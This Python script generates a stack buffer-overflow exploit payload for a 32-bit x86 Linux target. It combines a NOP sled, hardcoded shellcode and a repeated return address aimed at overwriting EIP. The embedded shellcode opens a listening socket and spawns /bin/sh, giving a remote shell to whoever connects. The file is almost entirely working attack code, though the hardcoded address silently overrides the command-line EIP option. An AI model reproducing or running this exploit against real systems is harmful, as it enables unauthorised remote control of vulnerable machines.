import struct
import argparse
import sys


def cli():
    parser = argparse.ArgumentParser()
    parser.add_argument('--padding', type=int)
    parser.add_argument('--EIP', type=str)
    args = parser.parse_args()
    EIP = struct.pack("I", int(args.EIP.split("0x")[-1], 16)) if args.EIP else None
    return args.padding, EIP


def build_payload(stack_safety_padding, EIP):
    injection_code = (
        "\x31\xc0\x31\xdb\x99\x50\x6a\x01\x6a\x02\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x89\xc6\x52\x66\x68"
        "\xaa\xaa\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x52\x56\x89\xe1"
        "\xb3\x04\xb0\x66\xcd\x80\x52\x52\x56\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x89\xc3\x31\xc9\xb1\x03"
        "\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x52"
        "\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xb3\x08\xcd\x80"
    )
    EIP = "\x60\xf0\xff\xbf"
    NOP = "\x90"
    
    overflow = 524
    buf_len = 512
    pre_eip_addresses = 7
    injection_code_len = len(injection_code)
    
    # slide + len_inj + padd + 4 = buf_len + rest = overflow
    slide = overflow - sum((stack_safety_padding, injection_code_len, pre_eip_addresses*4))
    
    return (
        (NOP * slide) +
        (injection_code) +
        (NOP * stack_safety_padding) +
        (EIP * 8)
    )
    
    
def main():
    padding, EIP = None, None
    if len(sys.argv) > 1:
        padding, EIP = cli()
    padding = padding or 256
    EIP = EIP or "\x60\xf0\xff\xbf"
    payload = build_payload(padding, EIP)
    print(payload)


if __name__ == "__main__":
    main()
    